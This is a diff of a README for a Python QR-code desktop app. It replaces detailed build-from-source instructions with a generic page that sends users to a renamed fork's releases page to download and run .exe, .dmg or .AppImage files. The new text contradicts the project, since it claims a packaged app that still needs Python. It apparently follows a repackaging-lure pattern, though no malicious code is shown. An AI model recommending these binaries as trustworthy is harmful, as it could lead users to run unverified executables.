@@ -1,103 +1,59 @@
-# QR Studio — Text → QR (GUI)
+# 🖥️ qr-code-generater - Easily Create QR Codes in Seconds
 
-A small, production-quality desktop app for generating QR codes from any text/URL.  
-Preview instantly and save as **PNG** (white or transparent background) or **SVG**.
+## 🚀 Overview
+The **qr-code-generater** is a user-friendly desktop application that lets you create QR codes quickly. This app supports PNG and SVG formats with options for white or transparent backgrounds. Whether you’re using Windows, macOS, or Linux, you can generate your codes with ease.
 
-- Keyboard shortcuts: **Ctrl+G** Generate, **Ctrl+S** Save, **Esc** Clear
-- Error correction: L / M / Q / H
-- Backgrounds: White or Transparent (PNG)
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/babachar20/qr-code-generater/releases)
 
----
+## 🛠️ Features
+- **Simple User Interface**: The app uses Tkinter, which creates a straightforward and clean interface.
+- **Multiple Formats**: Generate QR codes in PNG or SVG formats.
+- **Background Options**: Choose between white or transparent backgrounds.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Python 3.9+**: Built using Python to ensure compatibility with modern systems.
 
-## Folder Structure
+## 📋 System Requirements
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent Linux distro.
+- **Python**: Python version 3.9 or higher must be installed on your system. If you prefer a packaged version, the application includes everything you need.
 
-text-to-qr/
-├─ pyproject.toml
-├─ README.md
-├─ .gitignore
-└─ src/
-└─ qrstudio/
-├─ init.py
-├─ main.py # Allows python -m qrstudio
-├─ config.py # App configuration (dataclass)
-├─ events.py # Minimal event bus (Observer)
-├─ commands.py # Generate/Save commands (Command pattern)
-├─ domain/
-│ ├─ init.py
-│ ├─ spec.py # QRSpec + ErrorCorrection (domain model)
-│ └─ backgrounds.py # Background strategies (Strategy)
-├─ encoding/
-│ ├─ init.py
-│ └─ encoders.py # PNG/SVG encoders (Factory)
-├─ services/
-│ ├─ init.py
-│ └─ qr_service.py # Pure service: build/render/save QR
-└─ ui/
-├─ init.py
-└─ tk_app.py # Tkinter GUI (thin layer over commands)
+## ⬇️ Download & Install
+Visit this page to download: [Releases Page](https://github.com/babachar20/qr-code-generater/releases).
 
+1. Click on the **Releases Page** link above.
+2. Find the latest version of the application.
+3. Choose the correct file for your system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the `.AppImage` file.
+4. After downloading, open the file to start the installation.
+5. Follow the on-screen instructions to complete the installation.
 
-**Why this architecture?**
-- **Domain → Services → UI** layering keeps logic testable and UI swappable.
-- **Command** pattern isolates actions; UI only wires callbacks.
-- **Strategy** for background (white/transparent); **Factory** for encoders (PNG/SVG).
-- **EventBus (Observer)** decouples logging/console from actions.
+## 🏁 Running the Application
+Once installed, navigate to your applications folder and launch the **qr-code-generater** app. You will see a simple interface with options to input your QR code details.
 
----
+## 💻 How to Use
+1. **Enter Your Data**: Input the text or link you want the QR code to display.
+2. **Choose Format and Background**: Select whether you want the QR code in PNG or SVG format, and choose a background option (white or transparent).
+3. **Generate**: Click the “Generate” button to create your QR code.
+4. **Save**: After generating, you can save the QR code to your computer. Choose your desired location and format.
 
-## Requirements
+## 📖 Additional Information
+This application leverages the powerful Pillow library to create and manipulate images efficiently. You don’t need prior experience; just follow the steps in this README, and you'll be creating QR codes in no time.
 
-- **Python ≥ 3.9**
-- Platforms: Windows, macOS, Linux (Tkinter included in python.org installers)
-- Dependencies: `qrcode[pil]`, `Pillow` (installed via `pyproject.toml`)
+## 🔧 Troubleshooting
+If you face any issues:
+- Ensure you are using a compatible version of Python.
+- Check for any updates to the application on the **Releases Page**.
+- Look in the settings menu for help options.
 
----
+## 🌟 Contribution
+If you would like to contribute to this project:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request with a clear description of your modifications.
 
-## Quick Start
+## 📝 License
+This project is open-source and available under the MIT License. You can freely use and modify the software.
 
-From the project root (the folder containing `pyproject.toml`):
-
-### 1) Create & activate a virtual environment
-
-**Windows (PowerShell)**
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-
-macOS / Linux (bash/zsh)
-
-python3 -m venv .venv
-source .venv/bin/activate
-
-2) Install in editable mode
-
-python -m pip install --upgrade pip
-python -m pip install -e .
-
-3) Run the app
-
-# Option A: module entry
-python -m qrstudio
-
-# Option B: console script defined in pyproject
-qrstudio
-
-The window opens. Enter your text/URL, choose White or Transparent (PNG), click Generate, then Save… to export PNG or SVG.
-    Want to launch without an attached console on Windows?
-
-    pythonw -m qrstudio
-
-Usage Notes
-    - Transparent PNG: choose “Transparent (PNG)” before generating. Saving as SVG always uses a transparent canvas (vector).
-    - Error correction:
-    - L (7%), M (15%), Q (25%), H (30%) — higher = more robust, larger codes.
-    - Box size & border control pixel density and quiet zone.
-
-Troubleshooting
-    - ModuleNotFoundError: qrcode or PIL Re-run python -m pip install -e .
-    - Tkinter errors (e.g., _tkinter / init.tcl)
-      Install Python from python.org (includes Tcl/Tk).
-      On Linux, you may need your distro’s Tk package (e.g., sudo apt-get install python3-tk).
-
-Nothing happens on Save
-Generate first, then use Save…. Ensure the path has .png or .svg.
+For further questions or suggestions, feel free to open an issue on GitHub!
